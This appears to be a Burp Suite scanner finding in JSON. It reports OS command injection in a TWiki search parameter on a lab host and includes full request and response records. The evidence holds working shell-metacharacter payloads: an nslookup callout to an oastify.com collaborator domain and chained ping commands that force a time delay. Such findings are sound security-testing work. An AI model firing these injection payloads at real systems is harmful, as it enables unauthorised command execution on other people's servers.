{
  "name": "OS command injection",
  "type": "vulnerability",
  "severity": "High",
  "confidence": "Certain",
  "host": "",
  "path": "/twiki/bin/search/Main/",
  "url": "/twiki/bin/search/Main/",
  "evidence": [
    {
      "type": "CollaboratorEvidence",
      "detail": {
        "payload": {
          "bytes": "Jm5zbG9va3VwIC1xPWNuYW1lIG1yaHZoMDdvc3p2Z3F5aWJwYzh2ZHQ4cjVpYmIyenR3b2tqOGF2M2pzLm9hc3RpZnkuY29tLiYnXCJgMCZuc2xvb2t1cCAtcT1jbmFtZSBtcmh2aDA3b3N6dmdxeWlicGM4dmR0OHI1aWJiMnp0d29rajhhdjNqcy5vYXN0aWZ5LmNvbS4mYCc=",
          "flags": 18
        },
        "band_flags": [
          "out_of_band"
        ]
      },
      "request_response": {
        "url": "http://192.168.1.50/twiki/bin/search/Main/?scope=text&web=on&bookview=on&search=rbzEWw%26nslookup%20-q%3dcname%20mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com.%26%60'",
        "request": [
          {
            "type": "DataSegment",
            "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vP3Njb3BlPXRleHQmd2ViPW9uJmJvb2t2aWV3PW9uJnNlYXJjaD1yYnpFV3c=",
            "length": 71
          },
          {
            "type": "HighlightSegment",
            "data": "JTI2bnNsb29rdXAlMjAtcSUzZGNuYW1lJTIwbXJodmgwN29zenZncXlpYnBjOHZkdDhyNWliYjJ6dHdva2o4YXYzanMub2FzdGlmeS5jb20uJTI2JyU1YyUyMiU2MDAlMjZuc2xvb2t1cCUyMC1xJTNkY25hbWUlMjBtcmh2aDA3b3N6dmdxeWlicGM4dmR0OHI1aWJiMnp0d29rajhhdjNqcy5vYXN0aWZ5LmNvbS4lMjYlNjAn",
            "length": 183
          },
          {
            "type": "DataSegment",
            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYlNlYXJjaA0KDQo=",
            "length": 725
          }
        ],
        "response": [
          {
            "type": "DataSegment",
            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE1OjQzOjA5IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMzkwMg0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
            "length": 379
          },
          {
            "type": "SnipSegment",
            "length": 3702
          }
        ],
        "was_redirect_followed": false,
        "request_time": "1756827790701"
      },
      "dns_event": {
        "query_type": 5,
        "domain": "mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com",
        "query": "fXQAAAABAAAAAAAAKW1yaHZoMDdvc3p2Z3F5aWJwYzh2ZHQ4cjVpYmIyenR3b2tqOGF2M2pzB29hc3RpZnkDY29tAAAFAAE=",
        "time_stamp": "2025-Sep-02 15:43:09.794 UTC",
        "time_between_sending_payload_and_receiving_interaction": "0",
        "source_ip_address": "105.73.34.103",
        "source_port": 62142,
        "type": "dns",
        "interaction_id": "mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js",
        "description": "The Collaborator server received a DNS lookup of type CNAME for the domain name <b>mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com</b>.<br><br> The lookup was received from IP address 105.73.34.103:62142 at 2025-Sep-02 15:43:09.794 UTC."
      }
    },
    {
      "type": "TimingBasedEvidence",
      "evidence": {
        "type": "FirstOrderEvidence",
        "detail": {
          "payload": {
            "bytes": "fHBpbmcgLW4gMjEgMTI3LjAuMC4xfHxgcGluZyAtYyAyMSAxMjcuMC4wLjFgICMnIHxwaW5nIC1uIDIxIDEyNy4wLjAuMXx8YHBpbmcgLWMgMjEgMTI3LjAuMC4xYCAjXCIgfHBpbmcgLW4gMjEgMTI3LjAuMC4x",
            "flags": 17
          },
          "band_flags": [
            "in_band"
          ]
        },
        "request_response": {
          "url": "http://192.168.1.50/twiki/bin/search/Main/?search=%5c.*%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1&scope=topic&order=modified&reverse=on&regex=on&nosearch=on&limit=100",
          "request": [
            {
              "type": "DataSegment",
              "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vP3NlYXJjaD0lNWMuKg==",
              "length": 40
            },
            {
              "type": "HighlightSegment",
              "data": "JTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjElN2MlN2MlNjBwaW5nJTIwLWMlMjAyMSUyMDEyNy4wLjAuMSU2MCUyMCUyMyclMjAlN2NwaW5nJTIwLW4lMjAyMSUyMDEyNy4wLjAuMSU3YyU3YyU2MHBpbmclMjAtYyUyMDIxJTIwMTI3LjAuMC4xJTYwJTIwJTIzJTVjJTIyJTIwJTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjE=",
              "length": 188
            },
            {
              "type": "DataSegment",
              "data": "JnNjb3BlPXRvcGljJm9yZGVyPW1vZGlmaWVkJnJldmVyc2U9b24mcmVnZXg9b24mbm9zZWFyY2g9b24mbGltaXQ9MTAwIEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkNoYW5nZXMNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
              "length": 814
            }
          ],
          "response": [
            {
              "type": "DataSegment",
              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE1OjIyOjE5IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMjg1OA0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
              "length": 379
            },
            {
              "type": "SnipSegment",
              "length": 2658
            }
          ],
          "was_redirect_followed": false,
          "request_time": "1756826630812"
        }
      },
      "orig_response_completed_timer": "1387",
      "attack_response_completed_timer": "20382"
    }
  ],
  "description": "The <b>search</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.<br><br>The payload <b>&amp;nslookup -q=cname mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com.&amp;'\\\"`0&amp;nslookup -q=cname mrhvh07oszvgqyibpc8vdt8r5ibb2ztwokj8av3js.oastify.com.&amp;`'</b> was submitted in the search parameter. The application performed a DNS lookup for the specified domain name.<br><br>Additionally, the payload <b>|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1</b> was submitted in the search parameter. The application took <b>20382</b> milliseconds to respond to the request, compared with <b>1387</b> milliseconds for the original request, indicating that the injected command caused a time delay.",
  "remediation": "",
  "references": []
}